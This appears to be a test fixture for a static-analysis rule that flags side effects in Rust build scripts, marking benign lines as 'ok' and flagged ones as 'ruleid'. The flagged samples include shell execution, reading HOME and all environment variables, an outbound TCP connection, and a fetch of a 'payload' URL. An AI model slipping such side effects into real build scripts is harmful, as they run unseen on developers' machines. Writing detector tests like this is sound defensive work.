// Test cases for build.yaml. Harmless samples: nothing here is executed.
use std::process::Command;

fn main() {
    // ok: rust-build-script-side-effects
    println!("cargo:rerun-if-changed=src/lib.rs");
    // ok: rust-build-script-side-effects
    let out = std::env::var("OUT_DIR").unwrap();

    // ruleid: rust-build-script-side-effects
    let home = std::env::var("HOME").unwrap();
    // ruleid: rust-build-script-side-effects
    let _ = Command::new("sh").arg("-c").arg("id").status();
    // ruleid: rust-build-script-side-effects
    let _ = std::net::TcpStream::connect("203.0.113.7:443");
    // ruleid: rust-build-script-side-effects
    for (k, v) in std::env::vars() { let _ = (k, v); }
    let _ = (out, home);
}

fn more() {
    // ruleid: rust-build-script-side-effects
    let _ = reqwest::blocking::get("https://example.invalid/payload");
}
